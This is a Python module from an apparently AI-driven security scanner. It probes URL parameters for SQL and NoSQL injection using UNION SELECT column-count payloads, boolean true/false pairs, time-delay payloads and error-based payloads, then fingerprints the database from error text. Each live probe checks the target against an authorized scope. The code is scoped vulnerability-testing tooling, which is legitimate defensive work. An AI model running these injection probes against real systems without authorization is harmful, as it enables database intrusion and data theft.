"""Safe SQL/NoSQL injection probes and planning helpers."""

from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse

from argusai.core.infra.command import in_scope, normalize_scope
from argusai.core.security.evidence import curl_repro, evidence_record, response_excerpt
from argusai.core.payloads import PayloadLibrary, SQL_ERROR_RE


def inject_url_param(url: str, param: str, value: str) -> str:
    u = urlparse(url)
    q = parse_qsl(u.query, keep_blank_values=True)
    if any(k == param for k, _ in q):
        q = [(k, value if k == param else v) for k, v in q]
    else:
        q.append((param, value))
    return u._replace(query=urlencode(q)).geturl()


def sqli_union_plan(max_columns: int = 8) -> dict[str, Any]:
    max_columns = max(1, min(int(max_columns or 8), 20))
    payloads = []
    for n in range(1, max_columns + 1):
        cols = ",".join(["NULL"] * n)
        payloads.append(f"' UNION SELECT {cols}--")
    return {
        "ok": True,
        "payloads": payloads,
        "notes": "Use one payload at a time. Stop at the first response that changes from column mismatch to accepted shape.",
    }


def nosql_payloads() -> dict[str, Any]:
    payloads = [p.value for p in PayloadLibrary.SQLI if p.category == "nosqli"]
    return {
        "ok": True,
        "payloads": payloads,
        "test_case": "Try the JSON object in one field at a time and compare response shape/status against baseline.",
    }


async def sqli_probe_param(url: str, param: str, *, scope: str | list[str] | None = None, timeout: float = 15.0) -> dict[str, Any]:
    if not in_scope(url, normalize_scope(scope)):
        return {"ok": False, "error": f"target out of authorized scope: {url}", "url": url}
    import httpx

    payloads = [p.value for p in PayloadLibrary.SQLI if p.detect == "sql_error"][:10]
    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        try:
            base = await client.get(url)
        except Exception as e:
            return {"ok": False, "url": url, "error": str(e)}
        base_has_error = bool(SQL_ERROR_RE.search(base.text))
        for payload in payloads:
            test_url = inject_url_param(url, param, payload)
            try:
                resp = await client.get(test_url)
            except Exception:
                continue
            if SQL_ERROR_RE.search(resp.text) and not base_has_error:
                return {
                    "ok": True,
                    "vulnerable": True,
                    "type": "sqli_error",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": evidence_record(
                        kind="sqli",
                        surface=f"url_param:{param}",
                        payload=payload,
                        url=test_url,
                        status_code=resp.status_code,
                        response_excerpt=response_excerpt(resp.text, limit=900),
                        confidence="confirmed",
                        test_case=curl_repro(test_url),
                        repro_steps=["Open the test URL or run the curl command.", "Confirm SQL error appears only after payload injection."],
                    ),
                }
    return {"ok": True, "vulnerable": False, "url": url, "param": param, "tested": len(payloads)}


async def sqli_boolean_diff(url: str, param: str, *, scope: str | list[str] | None = None, timeout: float = 15.0) -> dict[str, Any]:
    if not in_scope(url, normalize_scope(scope)):
        return {"ok": False, "error": f"target out of authorized scope: {url}", "url": url}
    import httpx

    pairs = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' AND 1=1--", "' AND 1=2--"),
    ]
    async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True) as client:
        try:
            base = await client.get(url)
        except Exception as e:
            return {"ok": False, "url": url, "error": str(e)}
        for true_payload, false_payload in pairs:
            true_url = inject_url_param(url, param, true_payload)
            false_url = inject_url_param(url, param, false_payload)
            try:
                rt = await client.get(true_url)
                rf = await client.get(false_url)
            except Exception:
                continue
            base_len = len(base.text)
            true_delta = abs(len(rt.text) - base_len)
            false_delta = abs(len(rf.text) - base_len)
            if rt.status_code == base.status_code and (abs(len(rt.text) - len(rf.text)) > max(80, base_len * 0.15)):
                return {
                    "ok": True,
                    "vulnerable": True,
                    "type": "sqli_boolean_diff",
                    "param": param,
                    "true_url": true_url,
                    "false_url": false_url,
                    "true_len": len(rt.text),
                    "false_len": len(rf.text),
                    "evidence": evidence_record(
                        kind="sqli",
                        surface=f"url_param:{param}",
                        payload=f"{true_payload} / {false_payload}",
                        url=true_url,
                        confidence="suspected",
                        test_case=f"{curl_repro(true_url)}\n{curl_repro(false_url)}",
                        notes=f"true_delta={true_delta}, false_delta={false_delta}",
                    ),
                }
    return {"ok": True, "vulnerable": False, "url": url, "param": param, "tested": len(pairs) * 2}


async def sqli_time_probe(url: str, param: str, *, scope: str | list[str] | None = None, delay: int = 3, timeout: float = 12.0) -> dict[str, Any]:
    if not in_scope(url, normalize_scope(scope)):
        return {"ok": False, "error": f"target out of authorized scope: {url}", "url": url}
    import httpx

    delay = max(1, min(int(delay or 3), 5))
    payloads = [p.value.replace("3", str(delay)) for p in PayloadLibrary.SQLI if "time_delay" in p.detect][:3]
    async with httpx.AsyncClient(timeout=max(timeout, delay + 6), verify=False, follow_redirects=True) as client:
        try:
            t0 = time.perf_counter()
            await client.get(url)
            base_s = time.perf_counter() - t0
        except Exception as e:
            return {"ok": False, "url": url, "error": str(e)}
        for payload in payloads:
            test_url = inject_url_param(url, param, payload)
            try:
                t0 = time.perf_counter()
                resp = await client.get(test_url)
                elapsed = time.perf_counter() - t0
            except Exception:
                continue
            if elapsed - base_s >= delay - 0.5:
                return {
                    "ok": True,
                    "vulnerable": True,
                    "type": "sqli_time",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "baseline_s": round(base_s, 3),
                    "test_s": round(elapsed, 3),
                    "evidence": evidence_record(
                        kind="sqli",
                        surface=f"url_param:{param}",
                        payload=payload,
                        url=test_url,
                        status_code=resp.status_code,
                        confidence="suspected",
                        test_case=curl_repro(test_url),
                        notes=f"Baseline {base_s:.2f}s, test {elapsed:.2f}s.",
                    ),
                }
    return {"ok": True, "vulnerable": False, "url": url, "param": param, "tested": len(payloads)}


def dbms_fingerprint_from_error(text: str) -> dict[str, Any]:
    patterns = {
        "mysql": r"SQL syntax.*MySQL|Warning.*mysql_|MariaDB|You have an error in your SQL syntax",
        "postgresql": r"PostgreSQL|pg_query|syntax error at or near",
        "mssql": r"Microsoft SQL Server|ODBC SQL Server|SQL Server Native Client",
        "oracle": r"ORA-\d+|Oracle error",
        "sqlite": r"SQLite/JDBCDriver|sqlite3.OperationalError|near \".*\": syntax error",
    }
    hits = [name for name, pat in patterns.items() if re.search(pat, text, re.I)]
    return {"ok": True, "dbms_candidates": hits, "matched": bool(hits)}

